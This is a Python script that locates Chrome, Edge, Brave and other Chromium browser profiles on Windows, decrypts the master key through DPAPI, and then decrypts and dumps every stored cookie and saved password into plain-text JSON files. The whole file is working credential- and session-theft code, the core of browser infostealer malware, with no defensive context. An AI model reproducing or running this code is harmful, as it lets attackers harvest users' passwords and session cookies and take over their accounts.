import json
import base64
import sqlite3
import os
from Crypto.Cipher import AES
from win32 import win32crypt
from shutil import copyfile

LOCAL = os.environ['LOCALAPPDATA']
BROWSERS = {
    "chrome": f"{LOCAL}/Google/Chrome/User Data/",
    "edge": f"{LOCAL}/Microsoft/Edge/User Data/",
    "chromium": f"{LOCAL}/Chromium/User Data/",
    "brave": f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/",
    "vivaldi": f"{LOCAL}/Vivaldi/User Data/",
    "opera": f"{LOCAL}/Opera Software/Opera Stable"
}


def win_decrypt(encrypted_key):
    decrypted_value = win32crypt.CryptUnprotectData(
        encrypted_key, None, None, None, 0)[1]
    return decrypted_value


def chrome_80_decrypt(encrypted, chrome_key):
    nonce = encrypted[3:15]
    cipher = AES.new(chrome_key, AES.MODE_GCM, nonce=nonce)
    decrypted = cipher.decrypt(encrypted[15:])
    return decrypted[:-16].decode()


def confirm_exist(directory):
    return os.path.exists(directory)


def get_cookie_directory(base_dir):
    cookie_folders = (
        f"{base_dir}/Default/Cookies",
        f"{base_dir}/Cookies"
    )
    for cookie_folder in cookie_folders:
        if os.path.exists(cookie_folder):
            return cookie_folder
    return False


def get_login_directory(base_dir):
    login_folders = (
        f"{base_dir}/Default/Login Data",
        f"{base_dir}/Login Data"
    )
    for login_folder in login_folders:
        if os.path.exists(login_folder):
            return login_folder
    return False


def get_directories(base_dir):
    key_directory = f"{base_dir}/Local State"
    cookie_directory = get_cookie_directory(base_dir)
    login_directory = get_login_directory(base_dir)

    if cookie_directory and login_directory:
        return (key_directory, cookie_directory, login_directory)
    return None


def get_encryption_key(key_directory):
    with open(key_directory, "r") as f:
        encryption_key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        return win_decrypt(base64.b64decode(encryption_key)[5:])


def get_cookies(directory, key):
    new_file = f"{directory}.bak"
    copyfile(directory, new_file)
    conn = sqlite3.connect(new_file)
    cursor = conn.cursor()
    query = "SELECT host_key, name, value, encrypted_value FROM cookies"
    cursor.execute(query)
    results = cursor.fetchall()
    cookies = {}
    for url, name, value, encrypted in results:
        if url not in cookies:
            cookies[url] = []
        if value or encrypted[:3] == b"v10":
            decrypted = chrome_80_decrypt(encrypted, key)
        else:
            decrypted = win_decrypt(encrypted)
        cookie_obj = {"name": name, "value": decrypted, "domain": url}
        cookies[url].append(cookie_obj)
    conn.close()
    return cookies


def get_logins(directory, key):
    new_file = f"{directory}.bak"
    copyfile(directory, new_file)
    conn = sqlite3.connect(new_file)
    cursor = conn.cursor()
    query = "SELECT action_url, username_value, password_value FROM logins"
    cursor.execute(query)
    results = cursor.fetchall()
    logins = {}
    for url, username, encrypted in results:
        if url not in logins:
            logins[url] = []
        if encrypted[:3] == b"v10":
            decrypted = chrome_80_decrypt(encrypted, key)
        else:
            decrypted = win_decrypt(encrypted)
        login_obj = {"name": username, "value": decrypted, }
        logins[url].append(login_obj)
    conn.close()
    return logins


def save_data(logins=False, cookies=False):
    save_details = [
        [
            logins,
            "logins.json"
        ],
        [
            cookies,
            "cookies.json"
        ]
    ]
    for data in save_details:
        if data[0]:
            with open(data[1], "w") as f:
                json.dump(data[0], f, sort_keys=True, indent=4)


if __name__ == "__main__":
    key_directory, cookie_directory, login_directory = get_directories(
        BROWSERS["chrome"])
    chrome_key = get_encryption_key(key_directory)
    cookies = get_cookies(cookie_directory, chrome_key)
    logins = get_logins(login_directory, chrome_key)
    save_data(logins=logins, cookies=cookies)
